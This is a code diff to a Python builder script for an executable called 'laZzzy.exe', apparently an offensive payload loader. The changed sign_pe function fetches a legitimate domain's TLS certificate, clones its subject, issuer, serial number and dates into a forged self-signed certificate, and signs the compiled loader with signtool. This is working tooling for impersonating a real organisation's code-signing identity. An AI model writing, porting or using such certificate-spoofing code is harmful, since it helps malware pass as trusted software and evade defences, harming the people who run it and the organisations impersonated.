@@ -14,6 +14,14 @@ from itertools import cycle
 from Crypto.Cipher import AES
 from Crypto import Random
 from string import Template
+from cryptography import x509
+from cryptography.hazmat.primitives.serialization import pkcs12, Encoding, PrivateFormat, NoEncryption
+from cryptography.hazmat.primitives.serialization.pkcs12 import serialize_key_and_certificates
+
+import warnings
+from cryptography.utils import CryptographyDeprecationWarning
+warnings.filterwarnings("ignore", category=CryptographyDeprecationWarning)
+
 
 RELEASE_PATH = fr"{os.getcwd()}\loader\x64\Release\laZzzy.exe"
 
@@ -172,67 +180,50 @@ def compile():
 def sign_pe(domain, release_path):
     print(f"\t[*] Domain: \t\t\t{domain}")
 
-    domain_cert = ssl.get_server_certificate((domain, 443))
-    x509 = crypto.load_certificate(crypto.FILETYPE_PEM, domain_cert)
+    domain_cert_pem = ssl.get_server_certificate((domain, 443))
+    domain_cert = x509.load_pem_x509_certificate(domain_cert_pem.encode())
 
-    key = crypto.PKey()
-    key.generate_key(crypto.TYPE_RSA, x509.get_pubkey().bits())
-    cert = crypto.X509()
+    # Generate private key
+    from cryptography.hazmat.primitives.asymmetric import rsa
+    from cryptography.hazmat.primitives import hashes
+    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
 
-    version = x509.get_version()
-    cert.set_version(version)
-    print(f"\t[*] Version: \t\t\t{version}")
+    # Build certificate
+    cert_builder = x509.CertificateBuilder()
+    cert_builder = cert_builder.subject_name(domain_cert.subject)
+    cert_builder = cert_builder.issuer_name(domain_cert.issuer)
+    cert_builder = cert_builder.public_key(key.public_key())
+    cert_builder = cert_builder.serial_number(domain_cert.serial_number)
+    cert_builder = cert_builder.not_valid_before(domain_cert.not_valid_before)
+    cert_builder = cert_builder.not_valid_after(domain_cert.not_valid_after)
+    cert_builder = cert_builder.add_extension(
+        x509.SubjectAlternativeName([x509.DNSName(domain)]),
+        critical=False
+    )
+    cert = cert_builder.sign(private_key=key, algorithm=hashes.SHA256())
 
-    serial = x509.get_serial_number()
-    sn = "{:x}".format(serial)
-    sn = ":".join(sn[i:i+2] for i in range(0, len(sn), 2))
-    cert.set_serial_number(serial)
-    print(f"\t[*] Serial: \t\t\t{sn}")
-
-    subject = x509.get_subject()
-    cert.set_subject(subject)
-    subj = "".join("/{:s}={:s}".format(name.decode(), value.decode()) for name, value in subject.get_components())
-    print(f"\t[*] Subject: \t\t\t{subj}")
-
-    issuer = x509.get_issuer()
-    cert.set_issuer(issuer)
-    iss = "".join("/{:s}={:s}".format(name.decode(), value.decode()) for name, value in issuer.get_components())
-    print(f"\t[*] Issuer: \t\t\t{iss}")
-
-    not_before = x509.get_notBefore()
-    nb = datetime.strptime(not_before.decode(), "%Y%m%d%H%M%SZ").strftime("%B %d %Y")
-    cert.set_notBefore(not_before)
-    print(f"\t[*] Not Before: \t\t{nb}")
-
-    not_after = x509.get_notAfter()
-    na = datetime.strptime(not_after.decode(), "%Y%m%d%H%M%SZ").strftime("%B %d %Y")
-    cert.set_notAfter(not_after)
-    print(f"\t[*] Not After: \t\t\t{na}")
-
-    cert.set_pubkey(key)
-    cert.sign(key, "sha256")
-
-    crt_data = crypto.dump_certificate(crypto.FILETYPE_PEM, cert)
-    key_data = crypto.dump_privatekey(crypto.FILETYPE_PEM, key)
-
-    pkcs = crypto.PKCS12()
-    pkcs.set_privatekey(key)
-    pkcs.set_certificate(cert)
-    pfx_data = pkcs.export()
+    # Serialize key and certificate to PKCS#12
+    pfx_data = pkcs12.serialize_key_and_certificates(
+        name=domain.encode(),
+        key=key,
+        cert=cert,
+        cas=None,
+        encryption_algorithm=NoEncryption()
+    )
 
     crt_path = f"{os.getcwd()}\\output\\" + domain + ".crt"
     key_path = f"{os.getcwd()}\\output\\" + domain + ".key"
     pfx_path = f"{os.getcwd()}\\output\\" + domain + ".pfx"
 
-    with open(crt_path,"wb") as file:
-        file.write(crt_data)
+    with open(crt_path, "wb") as file:
+        file.write(cert.public_bytes(Encoding.PEM))
         file.close()
 
-    with open(key_path,"wb") as file:
-        file.write(key_data)
+    with open(key_path, "wb") as file:
+        file.write(key.private_bytes(Encoding.PEM, PrivateFormat.PKCS8, NoEncryption()))
         file.close()
-   
-    with open(pfx_path,"wb") as file:
+
+    with open(pfx_path, "wb") as file:
         file.write(pfx_data)
         file.close()
 
@@ -241,7 +232,6 @@ def sign_pe(domain, release_path):
     cmd = f"\"C:\\Program Files (x86)\\Microsoft SDKs\\ClickOnce\\SignTool\\signtool.exe\" sign /v /f {pfx_path} /fd SHA256 /tr http://sha256timestamp.ws.symantec.com/sha256/timestamp /td SHA256 {release_path}"
     p = subprocess.Popen(cmd, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
     out, err = p.communicate()
-
 
 def move_file(file_name, release_path):
     output_path = f"{os.getcwd()}\\output\\{file_name}"
